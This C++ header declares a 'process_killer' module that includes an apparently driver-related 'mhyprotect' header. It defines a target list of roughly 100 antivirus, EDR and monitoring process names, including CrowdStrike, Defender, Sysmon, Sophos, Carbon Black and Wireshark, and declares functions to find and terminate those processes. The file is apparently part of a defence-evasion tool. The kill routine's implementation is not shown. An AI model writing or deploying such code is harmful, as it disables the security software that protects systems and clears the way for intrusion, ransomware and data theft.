#pragma once
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include "../mhyprotect/mhyprotect.h"

namespace process_killer {
    //
// list of process names to kill
//
    const wchar_t* const process_list[] =
    {
        L"activeconsole", L"anti malware",    L"anti-malware",
        L"antimalware",   L"anti virus",      L"anti-virus",
        L"antivirus",     L"appsense",        L"authtap",
        L"avast",         L"avecto",          L"canary",
        L"carbonblack",   L"carbon black",    L"cb.exe",
        L"ciscoamp",      L"cisco amp",       L"countercept",
        L"countertack",   L"cramtray",        L"crssvc",
        L"crowdstrike",   L"csagent",         L"csfalcon",
        L"csshell",       L"cybereason",      L"cyclorama",
        L"cylance",       L"cyoptics",        L"cyupdate",
        L"cyvera",        L"cyserver",        L"cytray",
        L"darktrace",     L"defendpoint",     L"defender",
        L"eectrl",        L"elastic",         L"endgame",
        L"f-secure",      L"forcepoint",      L"fireeye",
        L"groundling",    L"GRRservic",       L"inspector",
        L"ivanti",        L"kaspersky",       L"lacuna",
        L"logrhythm",     L"malware",         L"mandiant",
        L"mcafee",        L"morphisec",       L"msascuil",
        L"msmpeng",       L"nissrv",          L"omni",
        L"omniagent",     L"osquery",         L"palo alto networks",
        L"pgeposervice",  L"pgsystemtray",    L"privilegeguard",
        L"procwall",      L"protectorservic", L"qradar",
        L"redcloak",      L"secureworks",     L"securityhealthservice",
        L"semlaunchsv",   L"sentinel",        L"sepliveupdat",
        L"sisidsservice", L"sisipsservice",   L"sisipsutil",
        L"smc.exe",       L"smcgui",          L"snac64",
        L"sophos",        L"splunk",          L"srtsp",
        L"symantec",      L"symcorpu",        L"symefasi",
        L"sysinternal",   L"sysmon",          L"tanium",
        L"tda.exe",       L"tdawork",         L"tpython",
        L"vectra",        L"wincollect",      L"windowssensor",
        L"wireshark",     L"threat",          L"xagt.exe",
        L"xagtnotif.exe", L"mssense"
    };


    wchar_t* to_lowercase(const wchar_t* str);
    int is_a_target(const wchar_t* name);

    void kill_target_processes();
}